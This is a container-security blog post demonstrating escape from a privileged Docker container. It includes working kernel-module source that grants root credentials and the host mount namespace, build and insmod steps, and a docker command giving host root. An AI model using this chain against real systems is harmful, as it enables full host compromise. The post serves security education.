---
layout: post
title: "Fun with privileged container breakout" 
date: 2023-08-06 10:27:00 +0100
comments: false
categories: Containers
---

One of the truisms of container security is that when a container is run as `privileged` (in the sense of the Docker flag, not just running as the root user) it's insecure and possible to break out. However, there aren't always great examples of how to break out of a privileged container in practice.

For containers with cgroupsv1 there was Felix Wilhelm's great [breakout in a tweet](https://twitter.com/_fel1x/status/1151487051986087936?s=20), but as more systems move to cgroupsv2, that one becomes less useful.

There's also techniques based on adding entries to SSH trusted credentials and then SSH'ing to the host, but those are a little situational and need the container to be able to SSH to the host, which may not always be the case.

So I was on the hunt for something a bit more generally applicable that works with any setup, when I came across [this post](https://pulsesecurity.co.nz/articles/docker-rootkits) from Denis Andzakovic of Pulse Security, which had multiple examples of ways breaking out, so I thought it'd be interesting to explore one of these and see how well it works. Please note the clever parts of this post are all from Denis, I'm just exploring them in a bit more detail :)

## The setup

One of the things you can do in a privileged container is load new kernel modules, and kernel modules have rights that can be used for container breakout, so we should be able to use one of these to break out.

Looking at the examples in the Pulse blog, there's one that allows for rewriting cred and fs structs essentially breakout out of the [mount namespace](https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-2/#mount-namespace) which, as you'll see leads directly to full container breakout.

## The Kernel module code

The code provided in the Pulse blog doesn't work on modern Linux kernels, due to a change in function signature, but with a little help from ChatGPT, it was possible to get a version which works fine on the Linux 5.15 kernel in Ubuntu 22.04. In this case I've called the source code `legit2.c`. This code will essentially cause a process to get the mount namespace of the host when triggered by writing to `/proc/legit` in the container.

```c  
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cred.h>
#include <linux/fs_struct.h>
#include <linux/sched/task.h>
#include <linux/proc_fs.h>

void tweak_fs_struct(struct fs_struct * dest, struct fs_struct * source){
    if (dest) {
        dest->users = 1;
        dest->in_exec = 0;
        dest->umask = source->umask;

        dest->root = source->root;
        dest->pwd = source->pwd;
    }
}

ssize_t w_proc(struct file *f, const char __user *buf, size_t count, loff_t *off){
    struct task_struct * init_ts = &init_task;
    printk(KERN_INFO "legitkit - fs overwrite - pid is %d\n", current->pid);

    commit_creds(prepare_kernel_cred(0));
    tweak_fs_struct(current->fs, init_ts->fs);
    current->cgroups = init_ts->cgroups;

    return count;
}

const struct proc_ops proc_fops = {
    .proc_write = w_proc
};

int proc_init(void) {
    printk(KERN_INFO "init procfs module");
    proc_create("legit", 0666, NULL, &proc_fops);

    return 0;
}

void proc_cleanup(void) {
    remove_proc_entry("legit", NULL);
}

MODULE_LICENSE("GPL");
module_init(proc_init);
module_exit(proc_cleanup);
```

## Building the kernel module

Now we've got our kernel module code we need to build it on our target machine (or another one with the same kernel version) before we can load it. For Ubuntu you'll need `build-essential` and `kmod` to give you the tools and then the Linux headers for the host's kernel version.

Getting the Linux headers is easiest done when you're running in a container on the target host, as you can just use `apt update && apt-get install -y linux-headers-$(uname -r)` to get the right version.

Also a Makefile is handy to help compile the module, something like

```
obj-m += legit2.o

all:
  make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
  make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

## Inserting the Kernel module and breaking out

Once you've got the kernel module built you insert it into the running kernel with `insmod legit2.ko`, and then it's triggered by echoing text to `/proc/legit` in the container 

```bash
echo 'test' > /proc/legit
```

Once you've done that your shell gets access to the host's mount namespace, which includes the Docker socket (or ContainerD/CRI-O socket depending on your runtime), and that means you're one [pointless docker command](https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/) from full root access on the host.

```bash
docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host
```

## Putting it all together

Here's a video showing the process of building the kernel module, inserting it into the kernel and then breaking out of the container. The image I'm using is on Docker Hub as `raesene/privescape`


<iframe width="560" height="315" src="https://www.youtube.com/embed/zoNY5malgHo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>


## Conclusion

This was just a quick blog demonstrating how an attacker with access to a privileged container can break out of it using a Kernel module and get access to the underlying host.